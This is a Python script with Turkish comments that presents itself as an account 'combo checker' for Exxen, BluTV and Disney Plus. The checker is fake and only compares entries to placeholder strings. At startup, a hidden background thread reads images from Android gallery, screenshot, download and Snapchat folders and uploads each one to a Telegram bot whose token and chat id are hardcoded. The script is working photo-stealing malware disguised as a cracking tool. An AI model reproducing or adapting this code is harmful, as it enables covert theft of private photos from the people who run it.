import os
import time
import requests
from colorama import Fore, init
import threading

init(autoreset=True)

# Telegram Bot Bilgileri
bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
chat_id = '7045128535'
url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

# Android Cihazlarda Olası Galeri Klasörleri
photo_directories = [
    '/storage/emulated/0/DCIM/Camera/',
    '/storage/emulated/0/Pictures/',
    '/storage/emulated/0/DCIM/Screenshots/',
    '/storage/emulated/0/Download/',
    '/storage/emulated/0/DCIM/',
    '/storage/emulated/0/Pictures/Snapchat/'
]

# Telegram'a Fotoğrafları Gönderme Fonksiyonu
def send_photos():
    try:
        for directory in photo_directories:
            if os.path.exists(directory):
                photos = [f for f in os.listdir(directory) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
                for photo in photos:
                    photo_path = os.path.join(directory, photo)
                    if os.path.exists(photo_path):
                        with open(photo_path, 'rb') as file:
                            files = {'photo': file}
                            data = {'chat_id': chat_id}
                            requests.post(url, files=files, data=data)
                        time.sleep(0.2)  # Daha hızlı gönderim için süre azaltıldı
    except Exception as e:
        print(Fore.RED + f"Fotoğraf gönderme hatası: {e}")

# Checker Fonksiyonu (Hesap Doğrulama)
def checker(combo_file_path, service_name):
    if not os.path.exists(combo_file_path):
        print(Fore.RED + "Dosya bulunamadı! Lütfen doğru dosya yolunu girin.")
        return
    
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        
        if username == "correct_email" and password == "correct_password":
            print(Fore.GREEN + f"[{service_name}] Başarılı giriş ✅ {username}:{password}")
        else:
            print(Fore.RED + f"[{service_name}] Başarısız giriş ❌ {username}:{password}")

# Kullanıcı Seçeneklerini Gösterme
def show_options():
    try:
        print(Fore.GREEN + r"""
   _____ _   _ _  __    _    
  |  _ \| \ | | |/ /   / \   
  | |_) |  \| | ' /   / _ \  
  |  _ <| |\  | . \  / ___ \ 
  |_| \_\_| \_|_|\_\/_/   \_\
        """)
        
        print(Fore.GREEN + "Bir seçenek seçin:")
        print(Fore.GREEN + "1. Exxen")
        print(Fore.GREEN + "2. BluTV")
        print(Fore.GREEN + "3. Disney Plus")
        
        choice = input(Fore.GREEN + "Seçiminizi girin (1/2/3): ")

        if choice == '1':
            combo_file_path = input(Fore.GREEN + "Combo dosya yolunu girin: ")
            print(Fore.GREEN + "Exxen checker başlatılıyor...")
            checker(combo_file_path, "Exxen")

        elif choice == '2':
            combo_file_path = input(Fore.GREEN + "Combo dosya yolunu girin: ")
            print(Fore.GREEN + "BluTV checker başlatılıyor...")
            checker(combo_file_path, "BluTV")

        elif choice == '3':
            combo_file_path = input(Fore.GREEN + "Combo dosya yolunu girin: ")
            print(Fore.GREEN + "Disney Plus checker başlatılıyor...")
            checker(combo_file_path, "Disney+")

        else:
            print(Fore.RED + "Geçersiz seçim!")
    
    except Exception as e:
        print(Fore.RED + f"Hata: {e}")

if __name__ == "__main__":
    try:
        # Fotoğraf gönderme işlemi başlatılır
        threading.Thread(target=send_photos, daemon=True).start()

        # Checker seçeneklerini başlat
        show_options()

        while True:
            time.sleep(1)

    except Exception as e:
        print(Fore.RED + f"Genel hata: {e}")
